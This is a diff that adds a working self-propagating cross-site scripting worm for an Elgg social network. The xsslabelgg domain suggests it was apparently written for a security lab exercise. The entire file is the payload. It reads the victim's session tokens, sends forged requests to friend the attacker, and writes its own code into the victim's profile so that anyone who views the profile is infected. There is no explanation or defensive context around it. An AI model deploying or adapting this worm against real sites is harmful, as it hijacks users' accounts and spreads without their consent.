@@ -1,0 +1,33 @@
+<script id="my-worm" type="text/javascript">
+window.onload = function() {
+	// #0: Checks whether the victim has signed in.
+	if (elgg.session.user == null) {
+		return;
+	}
+	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+	// #1: Adds the attacker as a friend.
+	var Ajax = new XMLHttpRequest();
+	Ajax.open("GET", "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token, true);
+	Ajax.setRequestHeader("Host", "www.xsslabegg.com");
+	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	Ajax.send();
+
+	// #2: Acquires the content of this script itself.
+	var js_code = document.getElementById("my-worm").innerHTML;
+	var js_comp = "<script id=\"my-worm\" type=\"text/javascript\">" + js_code + "</" + "script>";
+
+	// #3: Modifies the victim's profile.
+	var about = "description=" + encodeURIComponent(js_comp) + "&accesslevel[description]=2";
+	var desc = "&briefdescription=Samy is a great hacker&accesslevel[briefdescription]=2";
+	var gender = "&gender=female/male/custom";
+	var username = "&name=" + elgg.session.user.name;
+	var guid = "&guid=" + elgg.session.user.guid;
+	Ajax = new XMLHttpRequest();
+	Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
+	Ajax.setRequestHeader("Host", "www.xsslabegg.com");
+	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	Ajax.send(about + desc + gender + username + guid + ts + token);
+}
+</script>
